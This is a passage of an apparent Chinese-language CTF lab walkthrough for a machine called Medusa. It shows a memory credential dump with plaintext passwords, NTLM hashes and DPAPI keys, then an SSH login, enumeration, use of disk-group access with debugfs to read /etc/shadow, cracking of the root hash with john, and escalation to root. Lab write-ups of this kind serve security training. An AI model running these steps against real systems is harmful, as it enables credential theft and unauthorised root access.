  password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
 == WDIGEST [19d4d0]==
  username nolo
  domainname Medusa-PC
  password littl3_h4ck3r
  password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
 == TSPKG [19d4d0]==
  username nolo
  domainname Medusa-PC
  password littl3_h4ck3r
  password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000

== LogonSession ==
authentication_id 1381468 (15145c)
session_id 11
username numero6
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:59:06.967383+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1021
luid 1381468
 == MSV ==
  Username: numero6
  Domain: Medusa-PC
  LM: 3a9514532e68d1ade189cb5bf02b24bb
  NT: e28f0fd696fb69d3317f1927c9e8d15c
  SHA1: 8295426605ff734e2bf256b630d905983dd929b5
  DPAPI: NA
 == WDIGEST [15145c]==
  username numero6
  domainname Medusa-PC
  password n1mb3r_s1x
  password (hex)6e0031006d006200330072005f0073003100780000000000
 == Kerberos ==
  Username: numero6
  Domain: Medusa-PC
  Password: n1mb3r_s1x
  password (hex)6e0031006d006200330072005f0073003100780000000000
 == WDIGEST [15145c]==
  username numero6
  domainname Medusa-PC
  password n1mb3r_s1x
  password (hex)6e0031006d006200330072005f0073003100780000000000
 == TSPKG [15145c]==
  username numero6
  domainname Medusa-PC
  password n1mb3r_s1x
  password (hex)6e0031006d006200330072005f0073003100780000000000
 == DPAPI [15145c]==
  luid 1381468
  key_guid 05667fe6-e6a1-4e5d-ab98-d9ea9682dcf7
  masterkey 2bae1dc400a32522b6efe39fe24d7c253dc8c74bd1dfb890699f940be9a79fd6d6ef465cef7d0af4c70c9fa335065b178dd8cdbfa60f3dcd62e3e88d22521f2a
  sha1_masterkey ed4fb77971f735932fee0e9efd584e6d1bfb01e8

== LogonSession ==
authentication_id 1298068 (13ce94)
session_id 10
username ct0l4
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:58:42.033789+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1010
luid 1298068
 == MSV ==
  Username: ct0l4
  Domain: Medusa-PC
  LM: NA
  NT: c9bb6fbc746633a84652119bf544ebe3
  SHA1: 82848b1644602bd6a500625b37fd8ed14807fda8
  DPAPI: NA
 == WDIGEST [13ce94]==
  username ct0l4
  domainname Medusa-PC
  password b4ck3nd_pr0gr4m3r
  password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
 == Kerberos ==
  Username: ct0l4
  Domain: Medusa-PC
  Password: b4ck3nd_pr0gr4m3r
  password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
 == WDIGEST [13ce94]==
  username ct0l4
  domainname Medusa-PC
  password b4ck3nd_pr0gr4m3r
  password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
 == TSPKG [13ce94]==
  username ct0l4
  domainname Medusa-PC
  password b4ck3nd_pr0gr4m3r
  password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000

== LogonSession ==
authentication_id 1000050 (f4272)
session_id 9
username LordP4
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:57:52.044531+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1020
luid 1000050
 == MSV ==
  Username: LordP4
  Domain: Medusa-PC
  LM: 787465d75fac19613c442716b42e315b
  NT: 4aef2b11d1bb6c7594c904035f611937
  SHA1: 3f872737266578b9c6678f42ae1fadc19f34b523
  DPAPI: NA
 == WDIGEST [f4272]==
  username LordP4
  domainname Medusa-PC
  password Wh1t3_h4ck
  password (hex)570068003100740033005f006800340063006b0000000000
 == Kerberos ==
  Username: LordP4
  Domain: Medusa-PC
  Password: Wh1t3_h4ck
  password (hex)570068003100740033005f006800340063006b0000000000
 == WDIGEST [f4272]==
  username LordP4
  domainname Medusa-PC
  password Wh1t3_h4ck
  password (hex)570068003100740033005f006800340063006b0000000000
 == TSPKG [f4272]==
  username LordP4
  domainname Medusa-PC
  password Wh1t3_h4ck
  password (hex)570068003100740033005f006800340063006b0000000000
 == DPAPI [f4272]==
  luid 1000050
  key_guid 5062c530-69ce-4bc9-8272-9db84b775b3c
  masterkey 6f53397764e60e283d112ce7da1b9425fced09e213b8c02044f28f9146928c8c91f5ddc7b586faa3d6b5896cd3ffd8f07991187ab9061ab32f111cdf3641f4e2
  sha1_masterkey 1c8549da2ab13f26fe19d46bfafbccb6b518c96a

== LogonSession ==
authentication_id 933125 (e3d05)
session_id 8
username sml
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:57:13.015234+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1014
luid 933125
 == MSV ==
  Username: sml
  Domain: Medusa-PC
  LM: 92cae3307cc9b39593e28745b8bf4ba6
  NT: 37da1ddba9ebe6b1b36651fd5280c6af
  SHA1: 4b1f807db4643e6529e1e591b572435384743e2d
  DPAPI: NA
 == WDIGEST [e3d05]==
  username sml
  domainname Medusa-PC
  password th3_b0ss
  password (hex)7400680033005f006200300073007300
 == Kerberos ==
  Username: sml
  Domain: Medusa-PC
  Password: th3_b0ss
  password (hex)7400680033005f006200300073007300
 == WDIGEST [e3d05]==
  username sml
  domainname Medusa-PC
  password th3_b0ss
  password (hex)7400680033005f006200300073007300
 == TSPKG [e3d05]==
  username sml
  domainname Medusa-PC
  password th3_b0ss
  password (hex)7400680033005f006200300073007300

== LogonSession ==
authentication_id 845877 (ce835)
session_id 7
username spectre
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:56:09.715430+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1004
luid 845877
 == MSV ==
  Username: spectre
  Domain: Medusa-PC
  LM: NA
  NT: 6ec779920e220c163f33101085eff0b9
  SHA1: 4d3341113c66127df14de8cc6ac7b4ebf52d74b5
  DPAPI: NA
 == WDIGEST [ce835]==
  username spectre
  domainname Medusa-PC
  password 5p3ctr3_p0is0n_xX
  password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
 == Kerberos ==
  Username: spectre
  Domain: Medusa-PC
  Password: 5p3ctr3_p0is0n_xX
  password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
 == WDIGEST [ce835]==
  username spectre
  domainname Medusa-PC
  password 5p3ctr3_p0is0n_xX
  password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
 == TSPKG [ce835]==
  username spectre
  domainname Medusa-PC
  password 5p3ctr3_p0is0n_xX
  password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000

== LogonSession ==
authentication_id 763754 (ba76a)
session_id 6
username RiJaba1
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:55:03.742773+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1003
luid 763754
 == MSV ==
  Username: RiJaba1
  Domain: Medusa-PC
  LM: NA
  NT: 139988f1c9a8a7cb6fb03762a6d510e7
  SHA1: ff33ab3051fc5bc0fafd7d1c266c062136a1f266
  DPAPI: NA
 == WDIGEST [ba76a]==
  username RiJaba1
  domainname Medusa-PC
  password littl3_h4ck3r_v2
  password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
 == Kerberos ==
  Username: RiJaba1
  Domain: Medusa-PC
  Password: littl3_h4ck3r_v2
  password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
 == WDIGEST [ba76a]==
  username RiJaba1
  domainname Medusa-PC
  password littl3_h4ck3r_v2
  password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
 == TSPKG [ba76a]==
  username RiJaba1
  domainname Medusa-PC
  password littl3_h4ck3r_v2
  password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200

== LogonSession ==
authentication_id 682065 (a6851)
session_id 5
username jabatron
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:54:24.123633+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1008
luid 682065
 == MSV ==
  Username: jabatron
  Domain: Medusa-PC
  LM: 162b58d2300279d1b7f036d77017ce3e
  NT: 362e83945feaa2c874f39b670ef27deb
  SHA1: 60cd5410d0cf4659d2b6012e134ebb989a37a241
  DPAPI: NA
 == WDIGEST [a6851]==
  username jabatron
  domainname Medusa-PC
  password b1zum_3_AM
  password (hex)620031007a0075006d005f0033005f0041004d0000000000
 == Kerberos ==
  Username: jabatron
  Domain: Medusa-PC
  Password: b1zum_3_AM
  password (hex)620031007a0075006d005f0033005f0041004d0000000000
 == WDIGEST [a6851]==
  username jabatron
  domainname Medusa-PC
  password b1zum_3_AM
  password (hex)620031007a0075006d005f0033005f0041004d0000000000
 == TSPKG [a6851]==
  username jabatron
  domainname Medusa-PC
  password b1zum_3_AM
  password (hex)620031007a0075006d005f0033005f0041004d0000000000

== LogonSession ==
authentication_id 601672 (92e48)
session_id 4
username InfayerTS
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:52:52.583594+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1011
luid 601672
 == MSV ==
  Username: InfayerTS
  Domain: Medusa-PC
  LM: 09b8d9346bc2c8435c7e856a3bfa37de
  NT: 46a5b2901a6db08a0cb93a04dc6c1949
  SHA1: e0fab5eb95b7c356da9a8f4f0239b1a510fd12c6
  DPAPI: NA
 == WDIGEST [92e48]==
  username InfayerTS
  domainname Medusa-PC
  password UnD3sc0n0c1d0
  password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
 == Kerberos ==
  Username: InfayerTS
  Domain: Medusa-PC
  Password: UnD3sc0n0c1d0
  password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
 == WDIGEST [92e48]==
  username InfayerTS
  domainname Medusa-PC
  password UnD3sc0n0c1d0
  password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
 == TSPKG [92e48]==
  username InfayerTS
  domainname Medusa-PC
  password UnD3sc0n0c1d0
  password (hex)55006e00440033007300630030006e0030006300310064003000000000000000

== LogonSession ==
authentication_id 526374 (80826)
session_id 3
username d4t4s3c
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:52:02.861914+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1013
luid 526374
 == MSV ==
  Username: d4t4s3c
  Domain: Medusa-PC
  LM: 375262b6e52fb3710decb7ba03fdea49
  NT: 6dd06920b7a4203d195f9f05084d6cb6
  SHA1: 65b498805e94b4546396f8bd7a9ee093e85f1594
  DPAPI: NA
 == WDIGEST [80826]==
  username d4t4s3c
  domainname Medusa-PC
  password br4in_br34k3r
  password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
 == Kerberos ==
  Username: d4t4s3c
  Domain: Medusa-PC
  Password: br4in_br34k3r
  password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
 == WDIGEST [80826]==
  username d4t4s3c
  domainname Medusa-PC
  password br4in_br34k3r
  password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
 == TSPKG [80826]==
  username d4t4s3c
  domainname Medusa-PC
  password br4in_br34k3r
  password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000

== LogonSession ==
authentication_id 424519 (67a47)
session_id 2
username cromiphi
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:50:58.337500+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1005
luid 424519
 == MSV ==
  Username: cromiphi
  Domain: Medusa-PC
  LM: NA
  NT: e16a94ce4337564fbd00672ac12367fc
  SHA1: 4905a08610106fda3be33780dd1384a3fa326c4b
  DPAPI: NA
 == WDIGEST [67a47]==
  username cromiphi
  domainname Medusa-PC
  password br4in_br34k3r_v2
  password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
 == Kerberos ==
  Username: cromiphi
  Domain: Medusa-PC
  Password: br4in_br34k3r_v2
  password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
 == WDIGEST [67a47]==
  username cromiphi
  domainname Medusa-PC
  password br4in_br34k3r_v2
  password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
 == TSPKG [67a47]==
  username cromiphi
  domainname Medusa-PC
  password br4in_br34k3r_v2
  password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200

== LogonSession ==
authentication_id 121589 (1daf5)
session_id 1
username Medusa
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:39:39.941406+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1001
luid 121589
 == MSV ==
  Username: Medusa
  Domain: Medusa-PC
  LM: 44efce164ab921caaad3b435b51404ee
  NT: 32ed87bdb5fdc5e9cba88547376818d4
  SHA1: 6ed5833cf35286ebf8662b7b5949f0d742bbec3f
  DPAPI: NA
 == WDIGEST [1daf5]==
  username Medusa
  domainname Medusa-PC
  password 123456
  password (hex)31003200330034003500360000000000
 == Kerberos ==
  Username: Medusa
  Domain: Medusa-PC
  Password: 123456
  password (hex)31003200330034003500360000000000
 == WDIGEST [1daf5]==
  username Medusa
  domainname Medusa-PC
  password 123456
  password (hex)31003200330034003500360000000000
 == TSPKG [1daf5]==
  username Medusa
  domainname Medusa-PC
  password 123456
  password (hex)31003200330034003500360000000000

== LogonSession ==
authentication_id 121543 (1dac7)
session_id 1
username Medusa
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T13:39:39.941406+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1001
luid 121543
 == MSV ==
  Username: Medusa
  Domain: Medusa-PC
  LM: 44efce164ab921caaad3b435b51404ee
  NT: 32ed87bdb5fdc5e9cba88547376818d4
  SHA1: 6ed5833cf35286ebf8662b7b5949f0d742bbec3f
  DPAPI: NA
 == WDIGEST [1dac7]==
  username Medusa
  domainname Medusa-PC
  password 123456
  password (hex)31003200330034003500360000000000
 == Kerberos ==
  Username: Medusa
  Domain: Medusa-PC
  Password: 123456
  password (hex)31003200330034003500360000000000
 == WDIGEST [1dac7]==
  username Medusa
  domainname Medusa-PC
  password 123456
  password (hex)31003200330034003500360000000000
 == TSPKG [1dac7]==
  username Medusa
  domainname Medusa-PC
  password 123456
  password (hex)31003200330034003500360000000000

== LogonSession ==
authentication_id 96251 (177fb)
session_id 0
username ANONYMOUS LOGON
domainname NT AUTHORITY
logon_server 
logon_time 2023-01-17T13:39:17.902344+00:00
sid S-1-5-7
luid 96251

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username SERVICIO LOCAL
domainname NT AUTHORITY
logon_server 
logon_time 2023-01-17T13:39:16.843750+00:00
sid S-1-5-19
luid 997
 == Kerberos ==
  Username: 
  Domain: 

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username MEDUSA-PC$
domainname WORKGROUP
logon_server 
logon_time 2023-01-17T13:39:16.828125+00:00
sid S-1-5-20
luid 996
 == WDIGEST [3e4]==
  username MEDUSA-PC$
  domainname WORKGROUP
  password None
  password (hex)
 == Kerberos ==
  Username: medusa-pc$
  Domain: WORKGROUP
 == WDIGEST [3e4]==
  username MEDUSA-PC$
  domainname WORKGROUP
  password None
  password (hex)

== LogonSession ==
authentication_id 23426 (5b82)
session_id 0
username 
domainname 
logon_server 
logon_time 2023-01-17T13:39:16.734375+00:00
sid None
luid 23426

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username MEDUSA-PC$
domainname WORKGROUP
logon_server 
logon_time 2023-01-17T13:39:16.718750+00:00
sid S-1-5-18
luid 999
 == WDIGEST [3e7]==
  username MEDUSA-PC$
  domainname WORKGROUP
  password None
  password (hex)
 == Kerberos ==
  Username: medusa-pc$
  Domain: WORKGROUP
 == WDIGEST [3e7]==
  username MEDUSA-PC$
  domainname WORKGROUP
  password None
  password (hex)
 == DPAPI [3e7]==
  luid 999
  key_guid c005befa-c2f2-4f70-bce6-9199e1b3d537
  masterkey 1b9c89f8747b31e23126511d184effa733f09c0425e813e4665825ae711043d75cd33d21718256b4f002b11e9b7ce8beba3a4d0d1524f64ae07c5b11450393ed
  sha1_masterkey 063fc03a751363d0b597b119a554c505d50d79fc
 == DPAPI [3e7]==
  luid 999
  key_guid 4ec4ace1-da38-4c23-b8bc-311167afd57a
  masterkey 3e15960063b911f90ac5b696d08f049475736477a581d9bd878a348866d29fb8c4b1e07a2de410240676b55460681c876e9ef23ce64ba3bb6a84a72fbcd0fb17
  sha1_masterkey 599b49e8537fa1be1dbd88441989ae8d4bd4054d
 == DPAPI [3e7]==
  luid 999
  key_guid 4834d175-165a-48f4-9ecc-fb22225c3972
  masterkey ea21228b08295250eb17cc72fb17926fca02688a4ce2542889bf2ee0908d615160e234f19c4964d0d31c58a5a74df4a1152f5328049b65090e887b78f9371bfd
  sha1_masterkey 28594cfa5204bc52e36106051cd28ab896522920
 == DPAPI [3e7]==
  luid 999
  key_guid f22e410f-f947-4e08-8f2a-8f65df603f8d
  masterkey 19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa
  sha1_masterkey b859b2b52e7e49cf5c70069745c88853c4b23487
```

得到了spectre的用户密码，进行ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh spectre@192.168.21.6            
The authenticity of host '192.168.21.6 (192.168.21.6)' can't be established.
ED25519 key fingerprint is SHA256:YlA89tgUj1yicAk2Jpgi9F7UcnKVFzD/vTI4sla0JJE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.6' (ED25519) to the list of known hosts.
spectre@192.168.21.6's password: 
Linux medusa 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 21 14:57:30 2023 from 192.168.1.13
spectre@medusa:~$
```

看一下都有什么

```
spectre@medusa:~$ ls -la
total 32
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .
drwxr-xr-x 3 root    root    4096 Jan 15  2023 ..
-rw------- 1 spectre spectre  197 Jan 21  2023 .bash_history
-rw-r--r-- 1 spectre spectre  220 Jan 15  2023 .bash_logout
-rw-r--r-- 1 spectre spectre 3526 Jan 15  2023 .bashrc
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .local
-rw-r--r-- 1 spectre spectre  807 Jan 15  2023 .profile
-rw------- 1 spectre spectre   44 Jan 18  2023 user.txt
spectre@medusa:~$ sudo -l
sudo: unable to resolve host medusa: Name or service not known
[sudo] password for spectre: 
Sorry, user spectre may not run sudo on medusa.
spectre@medusa:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
spectre@medusa:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

提权

```
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            471M     0  471M   0% /dev
tmpfs            98M  512K   98M   1% /run
/dev/sda1       6.9G  6.5G     0 100% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000
spectre@medusa:~$ find / -name debugfs 2>/dev/null
/usr/sbin/debugfs
spectre@medusa:~$ /usr/sbin/debugfs -w /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
daemon:*:19372:0:99999:7:::
bin:*:19372:0:99999:7:::
sys:*:19372:0:99999:7:::
sync:*:19372:0:99999:7:::
games:*:19372:0:99999:7:::
man:*:19372:0:99999:7:::
lp:*:19372:0:99999:7:::
mail:*:19372:0:99999:7:::
news:*:19372:0:99999:7:::
uucp:*:19372:0:99999:7:::
proxy:*:19372:0:99999:7:::
www-data:*:19372:0:99999:7:::
backup:*:19372:0:99999:7:::
list:*:19372:0:99999:7:::
irc:*:19372:0:99999:7:::
gnats:*:19372:0:99999:7:::
nobody:*:19372:0:99999:7:::
_apt:*:19372:0:99999:7:::
systemd-network:*:19372:0:99999:7:::
systemd-resolve:*:19372:0:99999:7:::
messagebus:*:19372:0:99999:7:::
systemd-timesync:*:19372:0:99999:7:::
sshd:*:19372:0:99999:7:::
spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt root.txt --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (root)     
1g 0:00:00:14 DONE (2025-07-22 13:55) 0.06968g/s 260.9p/s 260.9c/s 260.9C/s 19871987..street
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
spectre@medusa:~$ su root
Password: 
root@medusa:/home/spectre# id
uid=0(root) gid=0(root) groups=0(root)
```
